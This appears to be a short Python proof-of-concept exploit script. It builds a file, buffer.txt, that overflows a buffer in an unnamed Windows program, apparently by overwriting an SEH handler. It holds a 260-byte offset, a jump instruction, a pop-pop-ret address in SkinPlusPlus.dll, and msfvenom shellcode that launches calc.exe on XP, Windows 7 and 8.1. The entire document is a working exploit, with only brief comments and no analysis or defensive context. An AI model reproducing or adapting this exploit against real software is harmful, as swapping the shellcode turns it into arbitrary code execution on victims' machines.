from struct import *

filename = 'buffer.txt'

# XP PRO SP3 / Win7 Enterprise SP1 / Win8.1 Enterprise
offset = 260 

buf = 'A' * offset

# jmp $+6
buf += '\xeb\x06\x90\x90' 

# pop pop ret -> SkinPlusPlus.dll@0x101056c5
buf += pack('<I',0x101056c5) 

# msfvenom -p windows/exec cmd="calc.exe" -f python -b '\x00\x0a\x0d'
buf += "\xdb\xd9\xbd\xa0\xbe\x6e\x88\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x31\x31\x6a\x18\x83\xea\xfc\x03\x6a\xb4\x5c"
buf += "\x9b\x74\x5c\x22\x64\x85\x9c\x43\xec\x60\xad\x43\x8a"
buf += "\xe1\x9d\x73\xd8\xa4\x11\xff\x8c\x5c\xa2\x8d\x18\x52"
buf += "\x03\x3b\x7f\x5d\x94\x10\x43\xfc\x16\x6b\x90\xde\x27"
buf += "\xa4\xe5\x1f\x60\xd9\x04\x4d\x39\x95\xbb\x62\x4e\xe3"
buf += "\x07\x08\x1c\xe5\x0f\xed\xd4\x04\x21\xa0\x6f\x5f\xe1"
buf += "\x42\xbc\xeb\xa8\x5c\xa1\xd6\x63\xd6\x11\xac\x75\x3e"
buf += "\x68\x4d\xd9\x7f\x45\xbc\x23\x47\x61\x5f\x56\xb1\x92"
buf += "\xe2\x61\x06\xe9\x38\xe7\x9d\x49\xca\x5f\x7a\x68\x1f"
buf += "\x39\x09\x66\xd4\x4d\x55\x6a\xeb\x82\xed\x96\x60\x25"
buf += "\x22\x1f\x32\x02\xe6\x44\xe0\x2b\xbf\x20\x47\x53\xdf"
buf += "\x8b\x38\xf1\xab\x21\x2c\x88\xf1\x2f\xb3\x1e\x8c\x1d"
buf += "\xb3\x20\x8f\x31\xdc\x11\x04\xde\x9b\xad\xcf\x9b\x54"
buf += "\xe4\x52\x8d\xfc\xa1\x06\x8c\x60\x52\xfd\xd2\x9c\xd1"
buf += "\xf4\xaa\x5a\xc9\x7c\xaf\x27\x4d\x6c\xdd\x38\x38\x92"
buf += "\x72\x38\x69\xf1\x15\xaa\xf1\xd8\xb0\x4a\x93\x24"

buf += 'D' * 2000

buf += '.swf'

f = open(filename,'w')
f.write(buf)
f.close()  
